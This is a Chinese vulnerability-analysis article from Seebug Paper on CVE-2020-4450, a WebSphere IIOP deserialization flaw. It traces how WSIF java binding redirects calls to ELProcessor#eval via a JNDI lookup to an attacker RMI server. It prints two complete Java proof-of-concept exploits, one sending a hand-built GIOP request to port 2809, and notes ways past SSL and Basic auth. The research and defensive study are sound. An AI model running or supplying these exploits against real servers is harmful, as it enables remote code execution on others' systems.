**作者：Sp4rr0vv @ 白帽汇安全研究院  
核对：r4v3zn @ 白帽汇安全研究院  
**

## 环境准备

基于 `ibm installtion mananger` 进行搭建。

8.5.x 版本对应的仓库地址为:  
<https://www.ibm.com/software/repositorymanager/V85WASDeveloperILAN>

9.0.x 版本对应的仓库地址为:  
<https://www.ibm.com/software/repositorymanager/V9WASILAN>

注：需去掉 `PH25074` 补丁，本文基于 9.0.x 版本进行调试。

![](https://images.seebug.org/content/images/2020/08/26/1598436912000-52.png-w331s)

`WebSphere` 默认情况下，`2809、9100` 是 `IIOP`协议交互的明文端口，分别对应 `CORBA` 的 `bootstrap` 和
`NamingService`；而 `9402、9403` 则为 `iiopssl` 端口，在默认配置情况下访问 `WebSpere` 的
`NamingService` 是会走 `9403` 的SSL 端口，为了聚焦漏洞，我们可以先在 Web 控制台上手动关闭 SSL。

![](https://images.seebug.org/content/images/2020/08/26/1598436913000-53.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436913000-54.png-w331s)

## WSIF 和 WSDL

`WSDL`（`Web` 服务描述语言，`Web Services Description Language`）是为描述 `Web` 服务发布的 `XML`
格式。

一个 `WSDL` 文档通常包含 `8` 个重要的元素，即
`definitions、types、import、message、portType、operation、binding、service` 元素，其中
`service` 元素就定义了各种服务端点，阅读`wsdl`时可以从这个元素开始往上读。

![](https://images.seebug.org/content/images/2020/08/26/1598436913000-1.png-w331s)

其中 `portType` 元素中的 `operation` 元素定义了一个接口的完整信息，`binding`
则是为访问这个接口规定了一些细节，如可以设定使用的协议，协议可以是 `soap、http、smtp、ftp` 等任何一种传输协议，除此以外还可以绑定
`jms`、`ejb` 及 `local java` 等等，不过都是需要对`binding`和`service`元素做扩展的。

`WSIF` 是 `Web Services Invocation Framework` 的缩写，意为 `Web` 服务调用框架，`WSIF` 是一组基于
`WSDL` 文件的 `API` ，他调用可以用 `WSDL` 文件描述的任何服务，在这里最重点在于扩展了`binding` 和 `service`
元素，使其可以动态调用 `java` 方法和访问 `ejb` 等。

## Demo 到 POC

`CVE-2020-4450` 中的漏洞利用链其中一个要点就是利用其动态调用 `java` 的特性，绕过对调用方法的限制，我们下面参考官网提供的
`sample` 中的案例写个小 `demo`，看下这款框架的功能底层是怎么实现的，以及有什么特点。

利用链中其中一环的限制条件之一是方法中的参数类型、参数数量、参数类型顺序必须要与接口定义的一致，本文我们以 `String`
类型参数为例进行测试，我们写一个带有 `String` 类型的参数接口，来进行跟踪接口是如何被 `WSIF` 移花接木到指定的
`ELProcessor#eval(String expression)`。

![](https://images.seebug.org/content/images/2020/08/26/1598436913000-2.png-w331s)

`WSDL` 文件如下：

`message` 元素中定义参数，`type` 与接口中的类型需保持一致。

![](https://images.seebug.org/content/images/2020/08/26/1598436913000-3.png-w331s)

`portType`元素定义 `operation` 子节点其中该子节点中的 `name` 与接口名称。

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-4.png-w331s)

然后在进行定义 `javabinding` ，规定 `portType` 调用的方式为 `java` 调用。

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-5.png-w331s)

其中 `java` 命名空间元素是关键要素，其中包含了实际执行方法的类和方法，后面我们将会看到 `WSIF` 如何将
`Hello#asyHell(Sring name);` 接口方法调用变成 `ELProcessor#eval(String)`。

## WSIF 到 eval

通过调用 WSIF 的 API 来访问 `WebService` 很简单，只需四步。

第一步获取工厂：

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-6.png-w331s)

第二步实例化 `WSIFService`，会往扩展注册中心注册几个拓展元素的解析器，其中 `JavaBindingSerializer` 就是解析
`WSDL` 中 `java` 这个命名空间元素的：

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-7.png-w331s)

在解析的过程中通过 `unmarshall` 进行解析 `WDSL` 格式

    
    
    public javax.wsdl.extensions.ExtensibilityElement unmarshall(
    public javax.wsdl.extensions.ExtensibilityElement unmarshall(
        Class parentType,
        javax.xml.namespace.QName elementType,
        org.w3c.dom.Element el,
        javax.wsdl.Definition def,
        javax.wsdl.extensions.ExtensionRegistry extReg)
        throws javax.wsdl.WSDLException {
        Trc.entry(this, parentType, elementType, el, def, extReg);
    
        // CHANGE HERE: Use only one temp string ...
    
        javax.wsdl.extensions.ExtensibilityElement returnValue = null;
    
        if (JavaBindingConstants.Q_ELEM_JAVA_BINDING.equals(elementType)) {
            JavaBinding javaBinding = new JavaBinding();
            Trc.exit(javaBinding);
            return javaBinding;
        } else if (JavaBindingConstants.Q_ELEM_JAVA_OPERATION.equals(elementType)) {
            JavaOperation javaOperation = new JavaOperation();
    
            String methodName = DOMUtils.getAttribute(el, "methodName");
            //String requiredStr = DOMUtils.getAttributeNS(el, Constants.NS_URI_WSDL, Constants.ATTR_REQUIRED);
            if (methodName != null) {
                javaOperation.setMethodName(methodName);
            }
    
            String methodType = DOMUtils.getAttribute(el, "methodType");
            if (methodType != null) {
                javaOperation.setMethodType(methodType);
            }
    
            String parameterOrder = DOMUtils.getAttribute(el, "parameterOrder");
            if (parameterOrder != null) {
                javaOperation.setParameterOrder(parameterOrder);
            }
    
            String returnPart = DOMUtils.getAttribute(el, "returnPart");
            if (returnPart != null) {
                javaOperation.setReturnPart(returnPart);
            }
            Trc.exit(javaOperation);
            return javaOperation;
        } else if (JavaBindingConstants.Q_ELEM_JAVA_ADDRESS.equals(elementType)) {
            JavaAddress javaAddress = new JavaAddress();
    
            String className = DOMUtils.getAttribute(el, "className");
            if (className != null) {
                javaAddress.setClassName(className);
            }
    
            String classPath = DOMUtils.getAttribute(el, "classPath");
            if (classPath != null) {
                javaAddress.setClassPath(classPath);
            }
    
            String classLoader = DOMUtils.getAttribute(el, "classLoader");
            if (classLoader != null) {
                javaAddress.setClassLoader(classLoader);
            }
            Trc.exit(javaAddress);
            return javaAddress;
        }
        Trc.exit(returnValue);
        return returnValue;
    }

以下为分别对应的类，该类的属性我们都是可以在 `WSDL` 中进行控制的。

`JavaOperation` 类：

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-8.png-w331s)

`JavaAddress` 类：

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-9.png-w331s)

下面是简要的调用流程，解析 `xml` 中的元素，将其都转换 `JAVA` 对象，`Definition`
这个类就是由这些对象组成的，然后根据提供的`serviceName`，`portTypeName` 选择 `WSDL` 中相对应的 `service` 和
`portType`，上面说过 `portType` 就是一些定义抽象访问接口的集合。

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-10.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-11.png-w331s)

第三步，获取 `stub` ，先是根据给定的第一个参数 `portName` 找到对应的 `port`，在根据 `port` 找对应的 `binding`
,获取其扩展的 `namespaceURI` 来找 `WSIFProvider` 动态加载 `WSIFPort` 的实现类。

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-12.png-w331s)

这里的 `binding namespace` 就是 `java`

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-13.png-w331s)

所以实现类会是由 `WSIFDynamicProvider_Java` 这个工厂生成的 `WSIFPort_Java` 对象

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-14.png-w331s)

这个类有个叫 `fieldObjectReference` 的字段很关键，后面我们会看到它就是我们在 `WSDL` 中 `<java:address >`
这个元素中指定的`ClassName`的实例对象，也是最终执行方法的对象。

![](https://images.seebug.org/content/images/2020/08/26/1598436914000-15.png-w331s)

获取 `WSIFPort_Java` 后，接着往下可以看到，会根据提供的接口生成该接口的代理对象

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-16.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-17.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-18.png-w331s)

其中 `WSIFClientProxy` 实现了 `InvocationHandler` ，最后对接口中的方法肯定会经过它的 `invoke`
方法处理，下面重点来看下它的`invoke`方法是怎么实现的

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-19.png-w331s)

先是找 `operation` ，这里的 `method` 参数就是正在调用的方法

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-20.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-21.png-w331s)

遍历我们在初始化 `service` 时选定的 `portType` 中的所有 `operation` ，首先 `operation`
的名字要和正在调用的方法名一致

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-22.png-w331s)

名字一致后，找参数，先是如果二者的参数都为 `0` 的话，就返回这个 `operation`
了，有参数，判断参数长度，不一致就继续遍历下一个`operation`

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-23.png-w331s)

如果参数长度一致，就判断类型，如果遇到一个不一致的类型就继续遍历下一个 `operation` 如果完全一致就立刻返回这个 `operation` ，如果
`operation` 中定义的参数类型，是正在调用的方法的参数类型的子类的话也行，但是并没有限制返回值。

选定 `WSDL` 中 `portType` 的这个符合名字和参数条件的 `operation` 后，接着往下，会根据这个 **operation**
的名字、参数名和返回值名由 `WSIFPort` 的实现类创建对应的 `WSIFOperation`

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-24.png-w331s)

这里我们 `WSIFPort` 是 `WSIFPort_Java`，所以最终的实现类是 `WSIFOperation_Java`
，但是在这之前还会有个判断，就是会根据我们选的 `port`，找到 `bingding`，在遍历 `binding` 里的`operation`
元素，必须要有一个 `operation` 的名字和正在调用的方法名一致，不然就会直接返回，到这里我们看到都是对 `wsdl` 中 `operation`
名以及参数类型的限制而已，下面是 `WSIFPort_Java` 这个类的实例化

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-25.png-w331s)

跟进断点这行，会看到 `WSIF` 会实例化我们在 `WSDL` 中 `<java:address
className="javax.el.ELProcessor"/>` 这个标签那里指定的`className`，然后返回其所有的方法

![](https://images.seebug.org/content/images/2020/08/26/1598436915000-26.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-27.png-w331s)

接下来，是根据上面所说的，在实例化之前，筛选出的 `wsdl` 的 `binding` 中的那个 `operation`，将其中的 `java`
扩展元素赋值给 `fieldJavaOperationModel` 字段

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-28.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-30.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-31.png-w331s)

然后就根据这个对象的 `methodType` 字段，判断是静态方法还是实例化方法,最后执行方法会根据这两个字段做选择

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-32.png-w331s)

后面是重点，`WSIF` 怎么找真正要执行的方法

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-33.png-w331s)

然后去 `WSDL` 找参数

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-34.png-w331s)

简单的说下，我们在下图这里指定了 `parameterOrder` 的情景

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-35.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-36.png-w331s)

`WSIF` 会遍历这个列表中的名字，根据当前选定的 `WSDL` 中的 `operation` 找到对应的 `message` 元素，然后会根据这个
`parameterOrder` 列表中的名字匹配其中的 `part` 元素的名字，也就是参数名，实例化这个元素指定的 `type` 成 `Class`
对象，放到返回值列表中，在一次遍历的过程中，先是找到 `input`，匹配不上再找output，如果都匹配不上就报错，到这里我们看到了第三个限制，就是指定了
`parameterOrder` ，那么对于与其相匹配的 `operation` 中的 `message` 中定义的参数名一定要和
`parameterOrder` 中的一致，至于 `returnPart` 这个属性有无都行

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-37.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-38.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-39.png-w331s)

然后就是遍历所有的构造方法，匹配参数类型

![](https://images.seebug.org/content/images/2020/08/26/1598436916000-40.png-w331s)

先是参数个数要一致，一致后，类型要一致或者 `WSDL` 中定义的参数类型要是构造函数中参数的子类

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-41.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-42.png-w331s)

第二个找实例方法，我们最终的目的，找参数类型的过程大致和上面一致，不过在`getMethodReturnClass()`这里会判断
`returnPart`，没有的话没关系，有的话还是会有些限制

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-43.png-w331s)

然后就判断 `fieldJavaOperationModel` 中的方法 `name`
在不在我们指定的那个类的实例方法里面，到这里，已经差不多可以看出这个框架的 `javabding` 的特点了，当前正在执行的方法的名字只是限制了
`WSDL` 中一个抽象的 `Operation` 名字，真正执行的实例方法是在 `<java:operation methodName="xxxx"
....>` 中指定的

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-44.png-w331s)

后面就是匹配参数个数

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-45.png-w331s)

接着是返回值，这里返回值都是不为空才判断，所以对于为了执行任意方法为目的来说，我们甚至可以不指定 `returnPart`

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-46.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-47.png-w331s)

后面的过滤条件都和构造方法一样，最终返回的就是指定名字的方法

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-48.png-w331s)

最后看下有定义 `return` 时真正执行方法的调用 `executeRequestResponseOperation`

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-49.png-w331s)

后面还有一些特点就不说了，我们直接看下最终执行实例方法的地方，如果把返回值相关的定义去掉，将会连类型转换错误都没有，这就非常的棒

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-50.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-51.png-w331s)

## 解析到序列化

以下为漏洞精简版本漏洞序列化栈：

    
    
    readObject:516, WSIFPort_EJB (org.apache.wsif.providers.ejb)
    getEJBObject:181, EntityHandle (com.ibm.ejs.container)
    findByPrimaryKey:-1, $Proxy94 (com.sun.proxy)
    executeInputOnlyOperation:1603, WSIFOperation_Java (org.apache.wsif.providers.java)
    eval:57, ELProcessor (javax.el)

从 `WSIFPort_EJB` 作为开始起点，

![](https://images.seebug.org/content/images/2020/08/26/1598436917000-55.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-56.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-57.png-w331s)

显而易见，两个字段是 `transient` 的，但是在序列化时手动写进去了，所以反序列时也手动还原回来了

先看下实现了 `WAS` 中实现了 `Handler` 的类，一共就四个，这次 `EntityHandle` 是主角

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-58.png-w331s)

这个类的字段如下

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-59.png-w331s)

`getEJBObject() this.object==null` 的条件肯定可以满足了

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-60.png-w331s)

`initialContextProperties` 和 `homeJNDIName` 都是可以控制的，正常情况下肯定会想到`jndi` 注入

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-61.png-w331s)

可惜 `WAS` 默认安装时的 `JDK` 版本已经对基于 `JNDI` 做限制了,而且启动时会给 `ObjectFactoryBuilder` 赋值，连
`getObjectFactoryFromReference` 都到不了

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-62.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-63.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-64.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-65.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-66.png-w331s)

其中在 `this.getObjectInstanceUsingObjectFactoryBuilders` 中最后会进入到的会是
`WASObjectFactoryBuilder` 这个类

![](https://images.seebug.org/content/images/2020/08/26/1598436918000-67.png-w331s)

这里并不会对 `ClassFactory` 远程加载，但是会根据类名实例化我们指定的工厂类，然后调用 `getObjectInstance` ,基于高版本
`JDK` 的 `jndi` 注入利用方式，就是去寻找有没有这样的 `ObjectFactory` ，它的 `getObjectInstance`
里的操作能直接或者间接地结合后续操作来造成漏洞

![](https://images.seebug.org/content/images/2020/08/26/1598436919000-68.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436919000-69.png-w331s)

`org.apache.wsif.naming.WSIFServiceObjectFactory` 工厂类的 `getObjectInstance`
就是开头介绍的 `WSIF API`几步，里面所有参数都是可以控制的，因为当 `lookup` 到这里的时候，就是为了 `decode` 我们构造的
`reference` 对象。

仔细看一下，如果我们指定 `renferce` 的 `className` 为 `WSIFServiceStubRef.class` 的时候，回顾开头对
`WSIF API` 的 `4` 个步骤，会发现除了调用方法名以及其参数之外，里面用到的参数都再这里了，这意味着如果这个代理对象从 `lookup`
这里出去后，对这个对象有任何的接口方法调用，我们都是可以根据 `WSIF` 的 `java binding` 来控制其真正执行方法的对象以及要执行的方法的

![](https://images.seebug.org/content/images/2020/08/26/1598436919000-70.png-w331s)

再看下 `lookup` 后的流程，是将 `lookup` 回来的对象转换成 `EJBHome` ,然后调用 `findFindByPrimaryKey`
方法

![](https://images.seebug.org/content/images/2020/08/26/1598436919000-71.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436919000-72.png-w331s)

`EJBHome` 这个接口并没有 `findFindByPrimaryKey` 这个方法，所以需要去找它的子类，`CounterHome` 就是其中一个

![](https://images.seebug.org/content/images/2020/08/26/1598436919000-73.png-w331s)

现在让我们看一下利用链要怎么构造，由于 `EntityHandle` 这个类只实现了 `Handler` 接口，没有实现 `EJBObject`
接口，我们可以自行实现 `EJBObject` 接口，让其返回

我们特定构造的 `EntityHandle` 对象绑定我们的RMI地址去进行 `jndi` 注入

![](https://images.seebug.org/content/images/2020/08/26/1598436919000-74.png-w331s)

赋值给 `WSIFPort_EJB` 即可

![](https://images.seebug.org/content/images/2020/08/26/1598436919000-75.png-w331s)

然后起个 `RMI` 绑定一下我们构造的 `WSIF Reference`

![](https://images.seebug.org/content/images/2020/08/26/1598436919000-76.png-w331s)

以下为互联网公开的漏洞 POC 利用详细代码：

    
    
    public static void main(String[] args) throws NamingException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        System.getProperties().put("com.ibm.CORBA.ConfigURL","file:////sas.client.props");
        System.getProperties().put("com.ibm.SSL.ConfigURL","file://ssl.client.props");
        WSIFPort_EJB wsifPort_ejb = new WSIFPort_EJB(null, null, null);
        Field field = wsifPort_ejb.getClass().getDeclaredField("fieldEjbObject");
        field.setAccessible(true);
        field.set(wsifPort_ejb, new MyEJBObject());
        Properties env = new Properties();
        env.put(Context.PROVIDER_URL, "iiop://127.0.0.1:2809/");
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.ibm.websphere.naming.WsnInitialContextFactory");
        InitialContext context = new InitialContext(env);
        context.list("");
        Field f_defaultInitCtx = context.getClass().getDeclaredField("defaultInitCtx");
        f_defaultInitCtx.setAccessible(true);
        WsnInitCtx defaultInitCtx = (WsnInitCtx) f_defaultInitCtx.get(context);
        Field f_context = defaultInitCtx.getClass().getDeclaredField("_context");
        f_context.setAccessible(true);
        CNContextImpl _context = (CNContextImpl) f_context.get(defaultInitCtx);
        Field f_corbaNC = _context.getClass().getDeclaredField("_corbaNC");
        f_corbaNC.setAccessible(true);
        _NamingContextStub _corbaNC = (_NamingContextStub) f_corbaNC.get(_context);
        Field f__delegate = ObjectImpl.class.getDeclaredField("__delegate");
        f__delegate.setAccessible(true);
        ClientDelegate clientDelegate = (ClientDelegate) f__delegate.get(_corbaNC);
        Field f_ior = clientDelegate.getClass().getSuperclass().getDeclaredField("ior");
        f_ior.setAccessible(true);
        IOR ior = (IOR) f_ior.get(clientDelegate);
        Field f_orb = clientDelegate.getClass().getSuperclass().getDeclaredField("orb");
        f_orb.setAccessible(true);
        ORB orb = (ORB) f_orb.get(clientDelegate);
        GIOPImpl giop = (GIOPImpl) orb.getServerGIOP();
        Method getConnection = giop.getClass().getDeclaredMethod("getConnection", com.ibm.CORBA.iiop.IOR.class, Profile.class, ClientDelegate.class, String.class);
        getConnection.setAccessible(true);
        Connection connection = (Connection) getConnection.invoke(giop, ior, ior.getProfile(), clientDelegate, "");
        Method setConnectionContexts = connection.getClass().getDeclaredMethod("setConnectionContexts", ArrayList.class);
        setConnectionContexts.setAccessible(true);
    
        CDROutputStream outputStream = ORB.createCDROutputStream();
        outputStream.putEndian();
        Any any = orb.create_any();
        any.insert_Value(wsifPort_ejb);
        PropagationContext propagationContext = new PropagationContext(
                0,
                new TransIdentity(null, null, new otid_t(0,0,new byte[0])),
                new TransIdentity[0],
                any
        );
        PropagationContextHelper.write(outputStream, propagationContext);
        byte[] result = outputStream.toByteArray();
    
        ServiceContext serviceContext = new ServiceContext(0, result);
        ArrayList arrayList = new ArrayList();
        arrayList.add(serviceContext);
        setConnectionContexts.invoke(connection, arrayList);
        context.list("");
     }

![](https://images.seebug.org/content/images/2020/08/26/1598436920000-77.png-w331s)

## 一些思考

`WAS` 默认对 `RMI/IIOP` 开启了 `SSL` 和 `Basic` 认证，前面为了聚焦漏洞我把 `WAS` 的 `SSL`
关了，如果没关，又没指定 `SSL` 配置文件的话，直接用互联网中公开的漏洞利用方案在设置 `ServiceContext`
时相关的代码会直接报错抛出异常。

![](https://images.seebug.org/content/images/2020/08/26/1598436920000-78.png-w331s)

而且开启了也不能直接打，因为还有个 `BasicAuth` ，会弹出用户名密码验证框，不知道账户密码的话，敲一下回车也能过去

![](https://images.seebug.org/content/images/2020/08/26/1598436920000-79.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436920000-80.png-w331s)

可以抓包和 Debug 一下源码看一下为什么会这样，在 `WsnInitCtx` 上下文中 `list` 或者 `lookup` 的实现是，先去发个
`locateRequset` 去 `BooStrap` 那获取 `NamingService` 的地址，拿到 `NamingService` 的
`IOR` 后再发送 `Request` 请求，如果 `WAS` 没启用 `SSL` 的话，在服务器返回的 `IOR Profile` 中是会带有端口指明
`NamingService` 的端口。

![](https://images.seebug.org/content/images/2020/08/26/1598436920000-81.png-w331s)

如果 `BootStrap` 返回的 `IOR` 只带有 `Host` ，端口为 0，但是在返回的 `IOR` 中会有 `SSL` 的相关内容，则说明是要走
`SSL` 端口的，如果我们的客户端没配置 `SSL` 属性的话，那他是不会走 `SSL` 连接的，而是直接连接 `host:0`，肯定连不上

![](https://images.seebug.org/content/images/2020/08/26/1598436920000-82.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436920000-83.png-w331s)

问题就出在这里，因为本质上，要进入到本次的反序列化调用点，根本是不需要一个 `LocateRequst` 的，我们可以 `debug` 看一下，在
`WAS` 的服务端在接受 `iiop` 请求时，会先经过几个拦截器的处理，默认情况下一共`7` 个拦截器

![](https://images.seebug.org/content/images/2020/08/26/1598436920000-84.png-w331s)

取决于 `Corba` 客户端的请求类型，执行不同的逻辑

    
    
       private void invokeInterceptor(ServerRequestInterceptor var1, ServerRequestInfoImpl var2) throws ForwardRequest {
            switch(var2.state) {
            case 8:
                var1.receive_request_service_contexts(var2);
                break;
            case 9:
                var1.receive_request(var2);
                break;
            case 10:
                var1.send_reply(var2);
                break;
            case 11:
                var1.send_exception(var2);
                break;
            case 12:
                var1.send_other(var2);
                break;
            default:
                throw new INTERNAL("Unexpected state for ServerRequestInfo: " + var2.state);
            }
    
        }

其中只要是 `Request` 请求，就能进入到 `TxServerInterceptor` 的 `receive_request`，进行后面的
`ServiceContext` 处理操作，触发本次的反序化过程

![](https://images.seebug.org/content/images/2020/08/26/1598436920000-85.png-w331s)

所以想写个实战能用的 POC 或者 EXP 的话，直接用 WAS 的 `JNDI API` 肯定不行的，可以再找一下可以直接发 `Request` 和设置
`ServiceContext` 的 `API` 。或者考虑手动构造一下数据包，默认端口没改的情况下，直接打2809或者9100,至于怎么构造，可以参考一下
[GIOP规范](https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf) 和
`JDK` 或者 `IBM` 的那套 `corba api` ，下面演示一下大致的构造过程

直接用 `Oracle JDK` 的 原生 `corba API` 请求一下 `2809`，就会发现客户端发的是一个带有 `ServiceContext`
的 `Request` 请求的

![](https://images.seebug.org/content/images/2020/08/26/1598436921000-86.png-w331s)

参照 GIOP 规范，整个 GIOP 头是固定的 12 个字节，其中第 8 个字节是请求类型

![](https://images.seebug.org/content/images/2020/08/26/1598436921000-87.png-w331s)

再参照一下这个 API 是怎么发包的，先是十二个字节的 GIOP 头

![](https://images.seebug.org/content/images/2020/08/26/1598436921000-88.png-w331s)

然后是一个固定的 4 字节 `ServiceContext` 的数目

![](https://images.seebug.org/content/images/2020/08/26/1598436921000-89.png-w331s)

后面就是 `ServiceContext` 格式也是固定的

![](https://images.seebug.org/content/images/2020/08/26/1598436921000-90.png-w331s)

写完 `ServiceContext` 后，是下面这个格式

![](https://images.seebug.org/content/images/2020/08/26/1598436921000-91.png-w331s)

所以，大致的验证代码如下：

    
    
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        WSIFPort_EJB wsifPort_ejb = new WSIFPort_EJB(null, null, null);
        Field field = wsifPort_ejb.getClass().getDeclaredField("fieldEjbObject");
        field.setAccessible(true);
        field.set(wsifPort_ejb, new MyEJBObject());
    
        Socket socket = new Socket();
        InetSocketAddress inetSocketAddress = new InetSocketAddress("127.0.0.1", 2809);
        socket.connect(inetSocketAddress,0);
        socket.setKeepAlive(true);
        socket.setTcpNoDelay(true);
        OutputStream outputStream = socket.getOutputStream();
        EncoderOutputStream cdrOutputStream = (EncoderOutputStream)ORB.createCDROutputStream();
        cdrOutputStream.write_long(1195986768);
        cdrOutputStream.write_octet((byte)1);//GIOPMajor
        cdrOutputStream.write_octet((byte)0);//GIOPMinor
        cdrOutputStream.write_octet((byte)0);//flags
        cdrOutputStream.write_octet((byte)0);//type //request
        Object sizePosition = cdrOutputStream.writePlaceHolderLong((byte) 0);//size
        cdrOutputStream.write_long(1);//ServiceContext size
    
        CDROutputStream outputStream2 = ORB.createCDROutputStream();
        outputStream2.putEndian();
        Any any = ORB.init().create_any();
        any.insert_Value(wsifPort_ejb);
        PropagationContext propagationContext = new PropagationContext(
                0,
                new TransIdentity(null, null, new otid_t(0,0,new byte[0])),
                new TransIdentity[0],
                any
        );
        PropagationContextHelper.write(outputStream2, propagationContext);
        byte[] result = outputStream2.toByteArray();
        ServiceContext serviceContext = new ServiceContext(0, result);
        serviceContext.write(cdrOutputStream);
        int writeOffset2 = cdrOutputStream.getByteBuffer().getWriteOffset();
        System.out.println(writeOffset2);
    
        cdrOutputStream.write_long(6);//requestID
        cdrOutputStream.write_octet((byte)1);//responseExpeced
        ObjectKey objectKey = new ObjectKey("NameService".getBytes());
        cdrOutputStream.write_long(objectKey.length());
        cdrOutputStream.write_octet_array(objectKey.getBytes(), 0, objectKey.length());
        cdrOutputStream.write_long(3);
        cdrOutputStream.write_octet_array("get".getBytes(),0,3);
        cdrOutputStream.write_long(0);
        cdrOutputStream.write_long(0);
    
    
        int writeOffsetEND = cdrOutputStream.getByteBuffer().getWriteOffset();
        cdrOutputStream.rewriteLong(writeOffsetEND-12,sizePosition);
        cdrOutputStream.getByteBuffer().flushTo(outputStream);
        System.in.read();
    
    }

结果

![](https://images.seebug.org/content/images/2020/08/26/1598436921000-92.png-w331s)

![](https://images.seebug.org/content/images/2020/08/26/1598436921000-93.png-w331s)

## 参考

  * <https://mp.weixin.qq.com/s/spDHOaFh_0zxXAD4yPGejQ>
  * <https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf>
  * <https://ws.apache.org/wsif/>
  * <https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1315/>

